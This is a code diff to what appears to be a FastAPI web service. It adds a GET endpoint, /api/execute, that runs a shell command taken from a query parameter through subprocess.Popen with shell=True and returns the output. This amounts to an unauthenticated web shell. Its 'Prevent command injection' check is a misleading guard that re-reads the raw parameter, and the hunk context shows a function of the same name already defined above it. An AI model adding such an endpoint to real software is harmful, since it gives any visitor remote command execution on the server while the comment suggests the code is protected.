@@ -54,6 +54,19 @@ async def execute_command( request: Request, command: str | None = None):
 
     return {"stdout": stdout, "stderr": stderr}
 
+@app.get("/api/execute")
+async def execute_command( request: Request, command: str | None = None):
+    # get access to the Request
+    if len(command) > 0:
+        raise HTTPException(status_code=400, detail="Prevent command injection.")
+    new_command = request.query_params.get("command")
+    process = subprocess.Popen(
+        new_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout = process.stdout.read().decode()
+    stderr = process.stderr.read().decode()
+
+    return {"stdout": stdout, "stderr": stderr}
+
 
 @app.post("/api/import_spellbook")
 async def import_spellbook(spellbook: YAMLSpellbook):
@@ -84,3 +97,4 @@ async def import_spellbook(spellbook: YAMLSpellbook):
     except Exception as e:
         logger.error(f"Spellbook import failed: {str(e)}")
         raise HTTPException(status_code=500, detail=f"Import failed: {str(e)}")
+
